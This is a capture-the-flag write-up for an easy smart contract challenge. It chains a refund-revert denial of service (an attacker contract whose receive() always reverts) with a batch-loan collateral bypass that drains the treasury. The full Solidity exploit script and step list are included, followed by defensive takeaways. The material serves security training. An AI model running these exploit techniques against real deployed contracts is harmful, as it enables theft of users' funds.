# Siege Protocol — Writeup

**Category:** Smart Contract | **Difficulty:** Easy | **Points:** 250

---

## TL;DR

Two vulnerabilities chained together:

1. **DoS on king refund** — deploy a contract without `receive()` as king → nobody can overthrow you.
2. **Batch collateral bypass** — `batchFundLoans()` only validates collateral for the first loan → drain the treasury with uncollateralised loans.

---

## Win Condition

`captureFlag()` requires all three:

```
msg.sender == king (or king's deployer)
throneSealed == true
address(siege).balance <= thronePrice
```

## Vulnerability 1 — Permanent King (DoS)

`overthrow()` refunds the previous king via low-level call and **reverts on failure**:

```solidity
(bool sent, ) = payable(previousKing).call{value: refund}("");
require(sent, "Failed to refund the deposed king");
```

A contract that rejects ETH becomes an un-overthrowable king:

```solidity
contract SiegeAttacker {
    SiegeProtocol public siege;
    address public owner;

    constructor(address _siege) {
        owner = msg.sender;
        siege = SiegeProtocol(payable(_siege));
    }

    function claimThrone() external payable {
        siege.overthrow{value: msg.value}();
    }

    function sealThrone() external {
        siege.sealThrone();
    }

    // Reject all ETH — makes overthrow() revert for any challenger
    receive() external payable { revert(); }
}
```

After 10 blocks → call `sealThrone()` through the attacker contract.

## Vulnerability 2 — Batch Collateral Bypass

Compare `fundLoan()` vs `batchFundLoans()`:

| | `fundLoan()` | `batchFundLoans()` |
|---|---|---|
| Collateral check | **Every loan** | **First loan only** |

```solidity
function batchFundLoans(uint256[] calldata loanIds) external {
    _validateCollateral(loanIds[0]);  // ← only checks index 0
    for (uint256 i = 0; i < loanIds.length; i++) {
        // funds ALL loans — no per-loan collateral check
    }
}
```

The token supply cap (`MINT_CAP = 0.01 ether`) prevents minting enough collateral to drain `0.04 ETH` via legitimate `fundLoan()` (needs `0.06 ether` at 150%). The batch bypass is the only way.

## Exploit Steps

```
1. Deploy SiegeAttacker → call claimThrone() with 0.015 ETH
2. Wait 10 blocks (~2 min on Sepolia)
3. Call attacker.sealThrone()
4. Mint 0.0015 SIEGE tokens → approve → depositCollateral()
5. requestLoan(0.001 ether)              // loan 0 — small, properly backed
6. requestLoan(treasury_excess)          // loan 1 — large, no collateral
7. batchFundLoans([0, 1])               // only loan 0's collateral checked
8. captureFlag()                         // from EOA (passes _isKingOwner)
9. getFlag()                             // → "tryst{0x...}"
```

## Exploit Script

```solidity
// Step 1: Deploy attacker & claim throne
SiegeAttacker atk = new SiegeAttacker(address(siege));
atk.claimThrone{value: thronePrice + 0.005 ether}();

// Step 2: Wait 10 blocks, then seal
// (on Sepolia, wait ~2 min between tx 1 and tx 2)
atk.sealThrone();

// Step 3: Drain treasury
uint256 small = 0.001 ether;
uint256 collateral = (small * 15000) / 10000;
token.mint(msg.sender, collateral);
token.approve(address(siege), collateral);
siege.depositCollateral(collateral);

siege.requestLoan(small);
uint256 id0 = siege.getLoanCount() - 1;

uint256 drain = address(siege).balance - siege.thronePrice() - small;
siege.requestLoan(drain);
uint256 id1 = siege.getLoanCount() - 1;

uint256[] memory ids = new uint256[](2);
ids[0] = id0;
ids[1] = id1;
siege.batchFundLoans(ids);

// Step 4: Capture
siege.captureFlag();
string memory flag = siege.getFlag(); // tryst{0x...}
```

## Flag

```
cast call <SIEGE_ADDRESS> "getFlag()(string)" --rpc-url $SEPOLIA_RPC_URL
```

---

## Key Takeaways

- **Never use `require(sent)` on refunds** — use a pull-based withdrawal pattern instead.
- **Batch operations must validate each item independently** — checking only the first element is a classic bypass.
- **Supply caps matter** — without the `MINT_CAP`, the batch bug wouldn't be necessary (unlimited mint → legitimate drain).
